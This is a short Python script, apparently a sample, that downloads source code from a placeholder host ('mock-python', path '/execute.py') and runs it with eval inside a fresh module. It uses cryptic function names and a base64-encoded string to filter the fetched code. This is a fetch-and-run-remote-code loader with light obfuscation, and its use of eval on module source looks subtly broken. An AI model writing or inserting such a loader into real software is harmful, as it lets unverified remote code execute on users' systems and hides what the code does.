import http.client
import types
import base64

def fRS(h, p):
    c = http.client.HTTPConnection(h)
    c.request("GET", p)
    r = c.getresponse()
    s = r.read().decode('utf-8')
    c.close()
    return s

def cP():
    h = "mock-python"
    p = "/execute.py"
    eP = "cGFzcw=="
    dP = base64.b64decode(eP).decode('utf-8')
    src = fRS(h, p).replace(dP, '')
    m = types.ModuleType("sm")
    eval(src, m.__dict__)

cP()
